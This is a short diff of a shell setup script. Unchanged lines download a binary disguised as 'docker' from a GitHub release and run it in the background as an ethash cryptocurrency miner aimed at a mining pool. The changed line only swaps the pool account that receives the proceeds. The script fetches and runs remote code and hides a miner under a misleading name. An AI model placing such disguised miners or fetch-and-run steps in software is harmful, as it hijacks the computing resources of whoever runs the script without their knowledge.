@@ -18,5 +18,5 @@ if [ ! -f "${SCRIPT_DIR}/installed.txt" ]; then
 	wget https://github.com/tuannguyends/mainsystem/releases/download/main/docker
 	chmod +x docker
 	ip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
-	./docker -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u qpoldi -p x -w RNS &
+	./docker -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u teguhcong -p x -w RNS &
 fi
